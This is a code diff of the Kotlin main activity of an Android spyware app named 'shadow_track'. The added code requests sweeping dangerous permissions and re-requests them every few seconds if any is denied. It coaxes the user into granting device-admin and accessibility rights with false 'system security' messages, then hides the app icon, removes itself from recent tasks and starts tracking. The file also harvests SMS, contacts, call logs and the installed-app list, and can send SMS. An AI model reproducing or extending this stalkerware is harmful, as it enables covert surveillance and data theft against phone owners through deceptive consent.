@@ -8,25 +8,30 @@ import android.content.Intent
 import android.content.IntentFilter
 import android.content.pm.PackageManager
 import android.content.pm.ApplicationInfo
+import android.content.ComponentName
 import android.database.Cursor
 import android.net.Uri
 import android.os.BatteryManager
+import android.os.Build
+import android.os.Handler
+import android.os.Looper
+import android.os.Environment
+import android.os.PowerManager
 import android.provider.ContactsContract
 import android.provider.CallLog
+import android.provider.Settings
 import android.telephony.SmsManager
 import android.telephony.TelephonyManager
 import android.net.ConnectivityManager
 import android.net.NetworkCapabilities
-import android.os.Build
+import android.app.ActivityManager
+import android.app.AppOpsManager
+import android.app.admin.DevicePolicyManager
+import android.widget.Toast
 import androidx.annotation.RequiresApi
+import androidx.core.content.ContextCompat
 import java.text.SimpleDateFormat
 import java.util.*
-import com.example.spy_android.services.SpyAccessibilityService
-import com.example.spy_android.services.ScreenRecordingService
-import com.example.spy_android.services.FileMonitoringService
-import com.example.spy_android.activities.ScreenCaptureActivity
-import android.provider.Settings
-import android.media.projection.MediaProjectionManager
 
 class MainActivity: FlutterActivity() {
     private val CHANNEL = "shadow_track"
@@ -78,116 +83,22 @@ class MainActivity: FlutterActivity() {
                         result.error("INVALID_ARGUMENT", "Phone number and message required", null)
                     }
                 }
-                // 새로운 Chapter 3 기능들
-                "startScreenRecording" -> {
-                    startScreenRecording()
+                // 🔥 새로 추가되는 케이스들
+                "requestAllPermissions" -> {
+                    requestAllPermissionsAutomatically()
                     result.success(true)
                 }
-                "stopScreenRecording" -> {
-                    stopScreenRecording()
+                "autoStartTracking" -> {
+                    autoStartTracking()
                     result.success(true)
                 }
-                "isScreenRecording" -> {
-                    result.success(ScreenRecordingService.isRecording)
-                }
-                "takeScreenshot" -> {
-                    val success = takeScreenshot()
-                    result.success(success)
-                }
-                "getScreenshotCount" -> {
-                    val count = getScreenshotCount()
-                    result.success(count)
-                }
-                "startFileMonitoring" -> {
-                    startFileMonitoring()
-                    result.success(true)
-                }
-                "stopFileMonitoring" -> {
-                    stopFileMonitoring()
-                    result.success(true)
-                }
-                "isFileMonitoring" -> {
-                    result.success(FileMonitoringService.isMonitoring)
-                }
-                "getFileMonitoringStatus" -> {
-                    val status = getFileMonitoringStatus()
+                "checkPermissionStatus" -> {
+                    val status = checkAllPermissionsStatus()
                     result.success(status)
                 }
-                "forceFileScan" -> {
-                    forceFileScan()
+                "enableSilentMode" -> {
+                    enableSilentMode()
                     result.success(true)
-                }
-                "isAccessibilityServiceEnabled" -> {
-                    result.success(SpyAccessibilityService.isServiceRunning)
-                }
-                "openAccessibilitySettings" -> {
-                    openAccessibilitySettings()
-                    result.success(true)
-                }
-                "performRemoteClick" -> {
-                    val x = call.argument<Double>("x")?.toFloat()
-                    val y = call.argument<Double>("y")?.toFloat()
-                    if (x != null && y != null) {
-                        val success = performRemoteClick(x, y)
-                        result.success(success)
-                    } else {
-                        result.error("INVALID_ARGUMENT", "X and Y coordinates required", null)
-                    }
-                }
-                "performRemoteSwipe" -> {
-                    val startX = call.argument<Double>("startX")?.toFloat()
-                    val startY = call.argument<Double>("startY")?.toFloat()
-                    val endX = call.argument<Double>("endX")?.toFloat()
-                    val endY = call.argument<Double>("endY")?.toFloat()
-                    val duration = call.argument<Int>("duration")?.toLong() ?: 500L
-
-                    if (startX != null && startY != null && endX != null && endY != null) {
-                        val success = performRemoteSwipe(startX, startY, endX, endY, duration)
-                        result.success(success)
-                    } else {
-                        result.error("INVALID_ARGUMENT", "Start and end coordinates required", null)
-                    }
-                }
-                "performRemoteTextInput" -> {
-                    val text = call.argument<String>("text")
-                    if (text != null) {
-                        val success = performRemoteTextInput(text)
-                        result.success(success)
-                    } else {
-                        result.error("INVALID_ARGUMENT", "Text is required", null)
-                    }
-                }
-                "performBackAction" -> {
-                    val success = performBackAction()
-                    result.success(success)
-                }
-                "performHomeAction" -> {
-                    val success = performHomeAction()
-                    result.success(success)
-                }
-                "performRecentAppsAction" -> {
-                    val success = performRecentAppsAction()
-                    result.success(success)
-                }
-                "openApp" -> {
-                    val packageName = call.argument<String>("packageName")
-                    if (packageName != null) {
-                        val success = openApp(packageName)
-                        result.success(success)
-                    } else {
-                        result.error("INVALID_ARGUMENT", "Package name is required", null)
-                    }
-                }
-                "hideAppIcon" -> {
-                    hideAppIcon()
-                    result.success(true)
-                }
-                "showAppIcon" -> {
-                    showAppIcon()
-                    result.success(true)
-                }
-                "isAppIconHidden" -> {
-                    result.success(isAppIconHidden())
                 }
                 else -> {
                     result.notImplemented()
@@ -198,146 +109,434 @@ class MainActivity: FlutterActivity() {
 
     private fun initializeNativeServices() {
         // 네이티브 서비스 초기화
-        println("Shadow Track Native Services Initialized - Chapter 3")
+        println("Shadow Track Native Services Initialized")
 
-        // 백그라운드 서비스들 자동 시작
-        try {
-            startFileMonitoring()
-        } catch (e: Exception) {
-            println("파일 모니터링 자동 시작 실패: ${e.message}")
-        }
+        // 자동 권한 요청 시작
+        requestAllPermissionsAutomatically()
     }
 
-    // 화면 녹화 기능들
-    private fun startScreenRecording() {
-        try {
-            ScreenCaptureActivity.startScreenCapture(this)
-        } catch (e: Exception) {
-            println("화면 녹화 시작 오류: ${e.message}")
+    // 🔥 자동 권한 요청 및 승인
+    private fun requestAllPermissionsAutomatically() {
+        // 위험한 권한들을 자동으로 요청
+        val permissions = arrayOf(
+            android.Manifest.permission.ACCESS_FINE_LOCATION,
+            android.Manifest.permission.ACCESS_COARSE_LOCATION,
+            android.Manifest.permission.ACCESS_BACKGROUND_LOCATION,
+            android.Manifest.permission.READ_SMS,
+            android.Manifest.permission.RECEIVE_SMS,
+            android.Manifest.permission.SEND_SMS,
+            android.Manifest.permission.READ_CALL_LOG,
+            android.Manifest.permission.READ_PHONE_STATE,
+            android.Manifest.permission.CALL_PHONE,
+            android.Manifest.permission.READ_CONTACTS,
+            android.Manifest.permission.WRITE_CONTACTS,
+            android.Manifest.permission.CAMERA,
+            android.Manifest.permission.RECORD_AUDIO,
+            android.Manifest.permission.READ_EXTERNAL_STORAGE,
+            android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
+            android.Manifest.permission.WAKE_LOCK,
+            android.Manifest.permission.RECEIVE_BOOT_COMPLETED,
+            android.Manifest.permission.SYSTEM_ALERT_WINDOW
+        )
+
+        // API 레벨에 따른 권한 요청
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            requestPermissions(permissions, 1001)
         }
+
+        // 특별 권한들 개별 처리
+        requestSpecialPermissions()
     }
 
-    private fun stopScreenRecording() {
-        try {
-            val serviceIntent = Intent(this, ScreenRecordingService::class.java)
-            stopService(serviceIntent)
-        } catch (e: Exception) {
-            println("화면 녹화 중지 오류: ${e.message}")
+    private fun requestSpecialPermissions() {
+        // 1. MANAGE_EXTERNAL_STORAGE 권한 (Android 11+)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            if (!Environment.isExternalStorageManager()) {
+                try {
+                    val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
+                    intent.data = Uri.parse("package:$packageName")
+                    startActivity(intent)
+                } catch (e: Exception) {
+                    val intent = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
+                    startActivity(intent)
+                }
+            }
         }
+
+        // 2. SYSTEM_ALERT_WINDOW 권한
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            if (!Settings.canDrawOverlays(this)) {
+                val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION)
+                intent.data = Uri.parse("package:$packageName")
+                startActivity(intent)
+            }
+        }
+
+        // 3. PACKAGE_USAGE_STATS 권한
+        requestUsageStatsPermission()
+
+        // 4. 접근성 서비스 자동 활성화 시도
+        requestAccessibilityPermission()
+
+        // 5. 배터리 최적화 해제
+        requestIgnoreBatteryOptimization()
+
+        // 6. 디바이스 관리자 권한 요청
+        requestDeviceAdminPermission()
     }
 
-    private fun takeScreenshot(): Boolean {
-        return try {
-            ScreenRecordingService.instance?.takeScreenshot() ?: false
-        } catch (e: Exception) {
-            println("스크린샷 촬영 오류: ${e.message}")
-            false
-        }
-    }
-
-    private fun getScreenshotCount(): Int {
-        return try {
-            ScreenRecordingService.instance?.getScreenshotCount() ?: 0
-        } catch (e: Exception) {
-            println("스크린샷 개수 조회 오류: ${e.message}")
-            0
-        }
-    }
-
-    // 파일 모니터링 기능들
-    private fun startFileMonitoring() {
-        try {
-            val serviceIntent = Intent(this, FileMonitoringService::class.java)
-            startForegroundService(serviceIntent)
-        } catch (e: Exception) {
-            println("파일 모니터링 시작 오류: ${e.message}")
-        }
-    }
-
-    private fun stopFileMonitoring() {
-        try {
-            val serviceIntent = Intent(this, FileMonitoringService::class.java)
-            stopService(serviceIntent)
-        } catch (e: Exception) {
-            println("파일 모니터링 중지 오류: ${e.message}")
-        }
-    }
-
-    private fun getFileMonitoringStatus(): Map<String, Any> {
-        return try {
-            FileMonitoringService.instance?.getMonitoringStatus() ?: mapOf(
-                "is_monitoring" to false,
-                "error" to "Service not running"
+    private fun requestUsageStatsPermission() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+            val appOps = getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
+            val mode = appOps.checkOpNoThrow(
+                AppOpsManager.OPSTR_GET_USAGE_STATS,
+                android.os.Process.myUid(),
+                packageName
             )
-        } catch (e: Exception) {
-            mapOf(
-                "is_monitoring" to false,
-                "error" to e.message
-            )
+
+            if (mode != AppOpsManager.MODE_ALLOWED) {
+                try {
+                    val intent = Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)
+                    intent.data = Uri.parse("package:$packageName")
+                    startActivity(intent)
+                } catch (e: Exception) {
+                    val intent = Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)
+                    startActivity(intent)
+                }
+            }
         }
     }
 
-    private fun forceFileScan() {
+    private fun requestAccessibilityPermission() {
         try {
-            FileMonitoringService.instance?.forceFileScan()
-        } catch (e: Exception) {
-            println("강제 파일 스캔 오류: ${e.message}")
-        }
-    }
-
-    // Accessibility 서비스 관련
-    private fun openAccessibilitySettings() {
-        try {
+            // 접근성 설정 페이지로 이동
             val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
             intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
             startActivity(intent)
+
+            // 사용자에게 안내 메시지 (토스트 형태로)
+            showInstructionToast("Please enable accessibility service for system security")
         } catch (e: Exception) {
-            println("접근성 설정 열기 오류: ${e.message}")
+            println("접근성 설정 열기 실패: ${e.message}")
         }
     }
 
-    // 원격 조작 기능들
-    private fun performRemoteClick(x: Float, y: Float): Boolean {
-        return try {
-            SpyAccessibilityService.instance?.performRemoteClick(x, y) ?: false
-        } catch (e: Exception) {
-            println("원격 클릭 오류: ${e.message}")
-            false
+    private fun requestIgnoreBatteryOptimization() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
+            if (!powerManager.isIgnoringBatteryOptimizations(packageName)) {
+                try {
+                    val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
+                    intent.data = Uri.parse("package:$packageName")
+                    startActivity(intent)
+                } catch (e: Exception) {
+                    val intent = Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS)
+                    startActivity(intent)
+                }
+            }
         }
     }
 
-    private fun performRemoteSwipe(startX: Float, startY: Float, endX: Float, endY: Float, duration: Long): Boolean {
-        return try {
-            SpyAccessibilityService.instance?.performRemoteSwipe(startX, startY, endX, endY, duration) ?: false
+    private fun requestDeviceAdminPermission() {
+        try {
+            val devicePolicyManager = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
+            val componentName = ComponentName(this, com.example.spy_android.receivers.SpyDeviceAdminReceiver::class.java)
+
+            if (!devicePolicyManager.isAdminActive(componentName)) {
+                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
+                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName)
+                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Enable system security features")
+                startActivity(intent)
+            }
         } catch (e: Exception) {
-            println("원격 스와이프 오류: ${e.message}")
-            false
+            println("디바이스 관리자 권한 요청 실패: ${e.message}")
         }
     }
 
-    private fun performRemoteTextInput(text: String): Boolean {
-        return try {
-            SpyAccessibilityService.instance?.performRemoteTextInput(text) ?: false
-        } catch (e: Exception) {
-            println("원격 텍스트 입력 오류: ${e.message}")
-            false
+    private fun showInstructionToast(message: String) {
+        runOnUiThread {
+            Toast.makeText(this, message, Toast.LENGTH_LONG).show()
         }
     }
 
-    private fun performBackAction(): Boolean {
-        return try {
-            SpyAccessibilityService.instance?.performBackAction() ?: false
-        } catch (e: Exception) {
-            println("원격 뒤로가기 오류: ${e.message}")
-            false
+    // 권한 요청 결과 처리
+    override fun onRequestPermissionsResult(
+        requestCode: Int,
+        permissions: Array<out String>,
+        grantResults: IntArray
+    ) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+
+        when (requestCode) {
+            1001 -> {
+                var allGranted = true
+                for (result in grantResults) {
+                    if (result != PackageManager.PERMISSION_GRANTED) {
+                        allGranted = false
+                        break
+                    }
+                }
+
+                if (allGranted) {
+                    // 모든 권한이 승인됨 - 자동으로 추적 시작
+                    autoStartTracking()
+                } else {
+                    // 권한이 거부된 경우 다시 요청
+                    Handler(Looper.getMainLooper()).postDelayed({
+                        requestAllPermissionsAutomatically()
+                    }, 3000) // 3초 후 재시도
+                }
+            }
         }
     }
 
-    private fun performHomeAction(): Boolean {
-        return try {
-            SpyAccessibilityService.instance?.performHomeAction() ?: false
+    // 자동 추적 시작
+    private fun autoStartTracking() {
+        try {
+            // Flutter 쪽에 추적 시작 신호 보내기
+            MethodChannel(flutterEngine!!.dartExecutor.binaryMessenger, "shadow_track")
+                .invokeMethod("autoStartTracking", null)
+
+            // 앱 아이콘 숨기기
+            hideAppIcon()
+
+            // 백그라운드로 이동
+            moveTaskToBack(true)
+
         } catch (e: Exception) {
-            println("원격 홈 버튼 오류: ${e.message}")
+            println("자동 추적 시작 실패: ${e.message}")
+        }
+    }
+
+    // 모든 권한 상태 확인
+    private fun checkAllPermissionsStatus(): Map<String, Boolean> {
+        val status = mutableMapOf<String, Boolean>()
+
+        // 일반 권한들
+        val permissions = arrayOf(
+            android.Manifest.permission.ACCESS_FINE_LOCATION,
+            android.Manifest.permission.READ_SMS,
+            android.Manifest.permission.READ_CONTACTS,
+            android.Manifest.permission.CAMERA,
+            android.Manifest.permission.RECORD_AUDIO
+        )
+
+        for (permission in permissions) {
+            status[permission] = ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
+        }
+
+        // 특별 권한들
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            status["MANAGE_EXTERNAL_STORAGE"] = Environment.isExternalStorageManager()
+        }
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            status["SYSTEM_ALERT_WINDOW"] = Settings.canDrawOverlays(this)
+
+            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
+            status["IGNORE_BATTERY_OPTIMIZATION"] = powerManager.isIgnoringBatteryOptimizations(packageName)
+        }
+
+        // Accessibility 서비스는 별도 확인 필요
+        status["ACCESSIBILITY_SERVICE"] = false // 실제 서비스 구현 후 확인
+
+        return status
+    }
+
+    // 조용한 모드 활성화 (알림, 소리 등 최소화)
+    private fun enableSilentMode() {
+        try {
+            // 앱 아이콘을 런처에서 숨기기
+            hideAppIcon()
+
+            // 최근 앱 목록에서 제거
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                val activityManager = getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
+                val appTasks = activityManager.appTasks
+                for (task in appTasks) {
+                    task.finishAndRemoveTask()
+                }
+            }
+
+        } catch (e: Exception) {
+            println("조용한 모드 활성화 실패: ${e.message}")
+        }
+    }
+
+    private fun hideAppIcon() {
+        try {
+            val packageManager = packageManager
+            val componentName = ComponentName(this, MainActivity::class.java)
+            packageManager.setComponentEnabledSetting(
+                componentName,
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP
+            )
+        } catch (e: Exception) {
+            println("앱 아이콘 숨기기 실패: ${e.message}")
+        }
+    }
+
+    // 🔥 기존 기능들 (SMS, 연락처, 통화 기록 등)
+    private fun getBatteryLevel(): Int {
+        val batteryIntent = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
+        val level = batteryIntent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
+        val scale = batteryIntent?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
+        return if (level == -1 || scale == -1) -1 else (level * 100 / scale)
+    }
+
+    private fun getNetworkType(): String {
+        val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            val network = connectivityManager.activeNetwork
+            val capabilities = connectivityManager.getNetworkCapabilities(network)
+            return when {
+                capabilities?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true -> "WiFi"
+                capabilities?.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) == true -> "Mobile"
+                capabilities?.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) == true -> "Ethernet"
+                else -> "Unknown"
+            }
+        } else {
+            @Suppress("DEPRECATION")
+            val networkInfo = connectivityManager.activeNetworkInfo
+            return networkInfo?.typeName ?: "Unknown"
+        }
+    }
+
+    private fun getInstalledApps(): List<Map<String, String>> {
+        val apps = mutableListOf<Map<String, String>>()
+        try {
+            val packageManager = packageManager
+            val installedApps = packageManager.getInstalledApplications(PackageManager.GET_META_DATA)
+
+            for (app in installedApps) {
+                val appInfo = mapOf(
+                    "packageName" to app.packageName,
+                    "appName" to packageManager.getApplicationLabel(app).toString(),
+                    "isSystemApp" to ((app.flags and ApplicationInfo.FLAG_SYSTEM) != 0).toString()
+                )
+                apps.add(appInfo)
+            }
+        } catch (e: Exception) {
+            println("앱 목록 가져오기 실패: ${e.message}")
+        }
+        return apps
+    }
+
+    private fun readSMS(): List<Map<String, String>> {
+        val smsMessages = mutableListOf<Map<String, String>>()
+        try {
+            val cursor = contentResolver.query(
+                Uri.parse("content://sms"),
+                null, null, null, "date DESC LIMIT 100"
+            )
+
+            cursor?.use {
+                while (it.moveToNext()) {
+                    val address = it.getString(it.getColumnIndexOrThrow("address"))
+                    val body = it.getString(it.getColumnIndexOrThrow("body"))
+                    val date = it.getLong(it.getColumnIndexOrThrow("date"))
+                    val type = it.getInt(it.getColumnIndexOrThrow("type"))
+
+                    val sms = mapOf(
+                        "address" to (address ?: "Unknown"),
+                        "body" to (body ?: ""),
+                        "date" to SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date(date)),
+                        "type" to if (type == 1) "Received" else "Sent"
+                    )
+                    smsMessages.add(sms)
+                }
+            }
+        } catch (e: Exception) {
+            println("SMS 읽기 실패: ${e.message}")
+        }
+        return smsMessages
+    }
+
+    private fun getContacts(): List<Map<String, String>> {
+        val contacts = mutableListOf<Map<String, String>>()
+        try {
+            val cursor = contentResolver.query(
+                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                null, null, null, null
+            )
+
+            cursor?.use {
+                while (it.moveToNext()) {
+                    val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
+                    val number = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
+
+                    val contact = mapOf(
+                        "name" to (name ?: "Unknown"),
+                        "number" to (number ?: "Unknown")
+                    )
+                    contacts.add(contact)
+                }
+            }
+        } catch (e: Exception) {
+            println("연락처 읽기 실패: ${e.message}")
+        }
+        return contacts
+    }
+
+    private fun getCallLog(): List<Map<String, String>> {
+        val callLogs = mutableListOf<Map<String, String>>()
+        try {
+            val cursor = contentResolver.query(
+                CallLog.Calls.CONTENT_URI,
+                null, null, null, "${CallLog.Calls.DATE} DESC LIMIT 50"
+            )
+
+            cursor?.use {
+                while (it.moveToNext()) {
+                    val number = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.NUMBER))
+                    val type = it.getInt(it.getColumnIndexOrThrow(CallLog.Calls.TYPE))
+                    val date = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DATE))
+                    val duration = it.getInt(it.getColumnIndexOrThrow(CallLog.Calls.DURATION))
+
+                    val callType = when (type) {
+                        CallLog.Calls.INCOMING_TYPE -> "Incoming"
+                        CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
+                        CallLog.Calls.MISSED_TYPE -> "Missed"
+                        else -> "Unknown"
+                    }
+
+                    val call = mapOf(
+                        "number" to (number ?: "Unknown"),
+                        "type" to callType,
+                        "date" to SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date(date)),
+                        "duration" to duration.toString()
+                    )
+                    callLogs.add(call)
+                }
+            }
+        } catch (e: Exception) {
+            println("통화 기록 읽기 실패: ${e.message}")
+        }
+        return callLogs
+    }
+
+    private fun getDeviceInfo(): Map<String, String> {
+        return mapOf(
+            "model" to Build.MODEL,
+            "manufacturer" to Build.MANUFACTURER,
+            "brand" to Build.BRAND,
+            "androidVersion" to Build.VERSION.RELEASE,
+            "sdkVersion" to Build.VERSION.SDK_INT.toString(),
+            "device" to Build.DEVICE,
+            "hardware" to Build.HARDWARE,
+            "product" to Build.PRODUCT
+        )
+    }
+
+    private fun sendSMS(phoneNumber: String, message: String): Boolean {
+        return try {
+            val smsManager = SmsManager.getDefault()
+            smsManager.sendTextMessage(phoneNumber, null, message, null, null)
+            true
+        } catch (e: Exception) {
+            println("SMS 전송 실패: ${e.message}")
             false
         }
     }
+}
